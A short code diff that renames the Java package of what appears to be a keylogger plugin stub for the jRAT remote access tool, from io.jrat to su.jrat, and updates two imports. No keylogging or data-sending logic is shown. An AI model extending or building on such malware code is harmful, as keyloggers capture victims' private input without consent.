@@ -1,7 +1,7 @@
-package io.jrat.plugin.keylogger.stub;
+package su.jrat.plugin.keylogger.stub;
 
-import io.jrat.plugin.keylogger.stub.activities.Activities;
-import io.jrat.plugin.keylogger.stub.activities.Title;
+import su.jrat.plugin.keylogger.stub.activities.Activities;
+import su.jrat.plugin.keylogger.stub.activities.Title;
 
 import com.sun.jna.Native;
 import com.sun.jna.Pointer;
